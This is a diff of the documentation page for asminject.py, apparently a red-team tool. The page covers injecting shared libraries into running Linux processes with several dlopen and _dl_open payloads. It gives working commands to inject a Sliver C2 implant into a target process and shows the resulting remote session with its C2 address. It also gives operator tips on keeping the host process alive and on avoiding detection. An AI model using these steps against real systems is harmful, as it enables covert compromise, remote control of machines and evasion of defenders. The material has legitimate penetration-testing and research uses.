@@ -1,16 +1,11 @@
 # asminject.py examples - Shared library injection
 
 * [Background](#background)
-* [Create a world-readable copy of a file using only Linux syscalls](#create-a-world-readable-copy-of-a-file-using-only-linux-syscalls)
-* [Execute arbitrary Python code inside an existing Python 3 process](#execute-arbitrary-python-code-inside-an-existing-python-3-process)
-* [Execute arbitrary Python code inside an existing Python 2 process](#execute-arbitrary-python-code-inside-an-existing-python-2-process)
-* [Execute arbitrary PHP code inside an existing PHP process](#execute-arbitrary-php-code-inside-an-existing-php-process)
-* [Execute arbitrary Ruby code inside an existing Ruby process](#execute-arbitrary-ruby-code-inside-an-existing-ruby-process)
-* [Inject Meterpreter into an existing process](#inject-meterpreter-into-an-existing-process)
-* [Inject shellcode into a separate thread of an existing process](#inject-shellcode-into-a-separate-thread-of-an-existing-process)
-* [Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py](#inject-a-linux-shared-library-so-file-into-an-existing-process-like-the-original-dlinjectpy)
-* [Inject a Linux shared library (.so) file into a new thread in an existing process](#inject-a-linux-shared-library-so-file-into-a-new-thread-in-an-existing-process)
-* [Create a copy of a file using buffered read/write libc calls](#create-a-copy-of-a-file-using-buffered-readwrite-libc-calls)
+* [Important](#important)
+* [dlopen with multithreading](#dlopen-with-multithreading)
+* [_dl_open with multithreading\](#dl-open-with-multithreading)
+* [dlopen without multithreading](#dlopen-without-multithreading)
+* [_dl_open without multithreading\](#dl-open-without-multithreading)
 
 ## Background
 
@@ -40,17 +35,23 @@ When `asminject.py` was originally developed, `dlinject.py` was hardcoded to loo
 
 Some (older?) versions of `ld` allegedly use(d?) a simpler signature for `_dl_open`: `void * _dl_open(const char *file, int mode, const void *caller_dlopen);`, but I haven't run across this yet in order to test it.
 
-In most cases, you should be able to use the first example below, because it handles both the `libdl` and `libc` variations on calling the `dlopen` function, and it's multithreaded, so the target process should continue as usual after the code is injected. The other options are provided for more constrained scenarios, e.g. if the target process doesn't have 
+In most cases, you should be able to use the first example below, because it handles both the `libdl` and `libc` variations on calling the `dlopen` function, and it's multithreaded, so the target process should continue as usual after the code is injected. The other options are provided for more constrained scenarios, e.g. if the target process doesn't have `libpthread` available, or if it's more advantageous to call `_dl_open` to avoid a particular detection mechanism.
+
+## Important
+
+Regardless of the payload and shared library you select, in virtually all cases you should avoid causing the shared library to issue a process-level `exit`, as this will cause the target process to exit as well. In my testing, common C2 agents for Linux will perform a system-level exit instead of a thread-level exit. I assume this is because unlike Windows, where calling a thread-level `exit` is more or less the same across versions, locating and calling the `pthread_exit` function on an arbitrary Linux distribution and version is more complicated, and so most(?) C2 authors don't implement it.
+
+In the case of [Sliver](https://github.com/BishopFox/sliver) and [Metasploit](https://github.com/rapid7/metasploit-framework), what this means is that instead of e.g. calling `kill` in a Sliver session or `exit` in a Meterpreter session, you should just send the session to the background unless you absolutely want the target process to exit.
 
 ## dlopen with multithreading
 
-This is the preferred option for injecting shared libraries into an existing process using `asminject.py`. It is the most straightfoward, best supported on various distributions, and the target process will continue executing normally after injection.
+The `dlinject-threaded.s` payload is the preferred option for injecting shared libraries into an existing process using `asminject.py`. It is the most straightfoward, best supported on various distributions (at least in my testing), and the target process will continue executing normally after injection.
 
 This payload requires one variable: `librarypath`, which should point to the library you want to inject.
 
 This payload requires relative offsets for the `ld` shared library used by the target process.
 
-Locate or build a `.so` file to open. For example, to set up a [Sliver]() C2 listener and implant:
+Locate or build a `.so` file to open. For example, to set up a [Sliver](https://github.com/BishopFox/sliver) C2 listener and implant:
 
 ```
 # ./sliver-server     
@@ -89,7 +90,7 @@ All hackers gain infect
 Inject the DLL into the target process:
 
 ```
-# python3 ./asminject.py 1957286 dlinject_threaded.s --arch x86\
+# python3 ./asminject.py 1957286 dlinject-threaded.s --arch x86\
    --relative-offsets-from-binaries --stop-method "slow" \
    --var librarypath "/home/user/MAGENTA_NEEDLE.so"
 ```
@@ -97,11 +98,7 @@ Inject the DLL into the target process:
 Back in the Sliver console, you should see something like this:
 
 ```
-[*] Session 5abe2db4 MAGENTA_NEEDLE - 10.1.10.216:5976 (localhost.localdomain) - linux/386 - Fri, 29 Jul 2022 15:35:21 PDT
-
-[server] sliver (MAGENTA_NEEDLE) > sessions -i casminject_libc_or_libdl_dlopen
-
-[!] Invalid session name or session number: casminject_libc_or_libdl_dlopen
+[*] Session 5abe2db4 MAGENTA_NEEDLE - 192.168.1.79:5976 (localhost.localdomain) - linux/386 - Fri, 29 Jul 2022 15:35:21 PDT
 
 [server] sliver > sessions -i 5abe2db4
 
@@ -121,16 +118,23 @@ Back in the Sliver console, you should see something like this:
            Version: Linux localhost.localdomain 5.18.11-1-pae
               Arch: 386
          Active C2: mtls://192.168.1.78:8888
-    Remote Address: 10.1.10.216:5976
+    Remote Address: 192.168.1.79:5976
          Proxy URL: 
 Reconnect Interval: 1m0s
 ```
 
-Warning: do not cause the DLL to exit (in this case, using the `kill` Sliver console command) unless you want the target process to exist as well. You can avoid this by backgrounding the Sliver session instead of exiting.
+## _dl_open with multithreading
 
+The `dlinject-ld-threaded.s` payload mimics the original `dlinject.py`, calling the `_dl_open` function that some versions of the `ld` library export (e.g. on OpenSUSE), and is multithreaded so that the target process continues executing normally after injection. `dlinject-ld-threaded.s` is currently an experimental feature, and only provided for the x86 architecture.
+
+```
+# python3 ./asminject.py 1957286 dlinject-ld-threaded.s --arch x86 \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
+```
 ## dlopen without multithreading
 
-This option is identical, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` is not required. Just swap out the payload name, e.g.:
+The `dlinject.s` payload is identical to the `dlinject-threaded.s` payload, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` is not required. Just swap out the payload name, e.g.:
 
 ```
 # python3 ./asminject.py 1957286 dlinject.s --arch x86-64 \
@@ -138,11 +142,9 @@ This option is identical, except that it does not spawn a separate thread. This 
    --var librarypath "/home/user/MAGENTA_NEEDLE.so"
 ```
 
-Warning: do not cause the DLL to exit (in this case, using the `kill` Sliver console command) unless you want the target process to exist as well. You can avoid this by backgrounding the Sliver session instead of exiting.
+## _dl_open without multithreading
 
-## _dl_open
-
-The `dlinject-ld.s` payload mimics the original `dlinject.py`, calling the `_dl_open` function that some versions of the `ld` library export (e.g. on OpenSUSE). It is currently an experimental feature, and only provided for the x86 architecture. From an operator perspective, it also only requires swapping out the payload name, but works differently under the hood.
+The `dlinject-ld.s` payload is identical to `dlinject-ld-threaded.s`, except that it does not call `_dl_open` in a separate thread. Like `dlinject.s`, this means that the `libpthread` library functions are not required, but it also means that the target process will stop doing its normal work in favour of whatever the injected code starts doing. `dlinject-ld.s` is currently an experimental feature, and only provided for the x86 architecture.
 
 ```
 # python3 ./asminject.py 1957286 dlinject-ld.s --arch x86 \
